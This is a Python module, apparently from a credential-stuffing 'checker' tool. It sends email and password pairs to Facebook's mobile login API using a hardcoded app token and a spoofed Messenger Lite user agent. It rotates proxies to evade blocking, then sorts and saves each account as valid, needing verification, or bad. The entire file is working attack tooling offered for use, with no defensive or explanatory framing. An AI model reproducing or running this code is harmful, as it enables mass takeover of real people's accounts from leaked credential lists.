from modules.variables import Checker
from modules.functions import bad_proxy, log,save,set_proxy
from requests import post

def check(email:str,password:str):
    retries = 0
    while retries != Checker.retries:
        proxy = set_proxy()
        proxy_set = set_proxy(proxy)
        
        data = f"email={email}&password={password}&credentials_type=password&error_detail_type=button_with_disabled&format=json&device_id=cdc4558c-4dd4-4fd0-9ba6-d09e0223d5e5&generate_session_cookies=1&generate_analytics_claim=1&generate_machine_id=1&method=auth.login"
        header_1 = {
            "content-type":"application/x-www-form-urlencoded",
            "authority": "b-api.facebook.com",
            "accept-language": "en-US,en;q=0.9",
            "authorization": "OAuth 200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko) [FBAN/MessengerLite;FBAV/115.0.0.2.114;FBPN/com.facebook.mlite;FBLC/ar_EG;FBBV/257412622;FBCR/Orange - STAY SAFE;FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi 7;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1369};]"
        }
        try:
            response = post("https://b-api.facebook.com/method/auth.login",data=data,headers=header_1,proxies=proxy_set,timeout=Checker.timeout)
            if "Invalid username or password" in response.text or "Invalid username or email address" in response.text:
                retries += 1
            elif "User must verify" in response.text or "User must confirm" in response.text:
                Checker.custom += 1
                Checker.cpm += 1
                if not Checker.cui:
                    log("custom",email+":"+password,"Facebook")
                save("Facebook","custom",Checker.time,email+":"+password)
                return
            elif "session_key" in response.text:
                Checker.good += 1
                Checker.cpm += 1
                if not Checker.cui:
                    log("good",email+":"+password,"Facebook")
                save("Facebook","good",Checker.time,email+":"+password)
                return
            else:
                raise
        except:
            bad_proxy(proxy)
            Checker.errors += 1
    Checker.bad += 1
    Checker.cpm += 1
    return